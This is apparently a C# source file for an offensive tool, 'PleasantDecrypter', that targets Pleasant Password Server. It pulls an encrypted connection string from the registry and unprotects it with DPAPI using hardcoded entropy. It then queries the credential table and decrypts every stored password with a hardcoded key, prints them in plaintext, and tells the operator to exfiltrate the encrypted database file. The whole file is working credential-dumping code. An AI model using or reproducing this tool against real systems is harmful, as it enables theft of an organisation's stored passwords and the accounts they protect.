using System;
using System.Text;
using System.Security.Cryptography;
using System.Data.SqlClient;

namespace PleasantDecrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string func = args[0].ToLower();
                int numArgs = args.Length - 1;
                switch (func)
                {
                    case "connstring":
                        DumpConnectionString();
                        break;
                    case "mssqldumpcreds":
                        if (numArgs == 1)
                        {
                            MssqlDumpCreds(args[1]);
                        }
                        break;
                    default:
                        Console.WriteLine("[X] Unknown Function: " + func);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Invalid arguments.\n");
                Console.WriteLine("[!] Usage:\n\n\tPleaseantDecrypter.exe <function> <args>");
            }
        }
        static void MssqlDumpCreds(string connectionString)
        {
            string queryString = "SELECT Name,Username,Password FROM dbo.CredentialObject";
            Console.WriteLine("[!] Connecting to: " + connectionString + "\n[!] Query string: " + queryString);
            using (SqlConnection connection = new SqlConnection(connectionString))
            {
                SqlCommand command = new SqlCommand(queryString, connection);
                connection.Open();
                SqlDataReader reader = command.ExecuteReader();
                string key = "36AB08A4-422E-4e63-916F-C356691C08F3";
                Console.WriteLine("\nNAME:USERNAME:Password\n-----------------------------");
                try
                {
                    while (reader.Read())
                    {
                        if (!Convert.IsDBNull(reader["Password"]))
                        {
                            byte[] encryptedPassword = (byte[])reader["Password"];
                            Console.WriteLine(String.Format("{0}:{1}:{2}",
                            reader["Name"], reader["Username"], EncryptionHelper.DecryptToString(key, EncryptionHelper.StringToByteArray(BitConverter.ToString(encryptedPassword).Replace("-", "")))));

                        }
                    }
                }
                finally
                {
                    reader.Close();
                }
            }
        }

        static void DumpConnectionString()
        {
            string encryptedConnectionString, connectionString;
            if (string.IsNullOrEmpty(encryptedConnectionString = GetRegKey()))
            {
                return;
            }
            Console.WriteLine("[!] Got encrypted connection string: " + encryptedConnectionString);
            Console.WriteLine("[!] Attempting to decrypt...");
            if (string.IsNullOrEmpty(connectionString = DecryptRegKey(encryptedConnectionString)))
            {
                return;
            }
            Console.WriteLine("[!] Success! \n\n [!] Connection string: " + connectionString);
            if (connectionString.Contains(";Key=aes256:"))
            {
                Console.WriteLine("\n[!] AES-encrypted SQLite DB!\n[!] Exfiltrate for offline review: \"C:\\ProgramData\\Pleasant Solutions\\Password Server\\PleasantPassServer.db\"");
            }

        }

        static string DecryptRegKey(string encryptedConnectionString)
        {
            byte[] additionalEntropy = { 0x9D, 0x38, 0x4A, 0xB6, 0x2D, 0x0E, 0x4E, 0x2F, 0x5A, 0x66, 0x44, 0x7B, 0x7A, 0x3E, 0x30, 0x69 };
            try
            {
                return Encoding.ASCII.GetString(ProtectedData.Unprotect(Convert.FromBase64String(encryptedConnectionString), additionalEntropy, DataProtectionScope.LocalMachine));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Something went wrong: " + ex);
                Console.WriteLine("[X] Has AdditionalEntropy changed? Check PassMan.Configuration.dll Constants...");
                return null;
            }

        }

        static string GetRegKey()
        {
            try
            {
                string keyPath = @"SOFTWARE\Pleasant Solutions\PasswordManager";
                string keyName = "DatabaseConnectionString";
                object connectionString = RegistryHelper.GetRegistryValue(keyPath, keyName);
                return connectionString.ToString();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Something went wrong: " + ex);
                Console.WriteLine("[X] Reg key likely empty or not enough privs.");
                return null;

            }
        }
    }
}
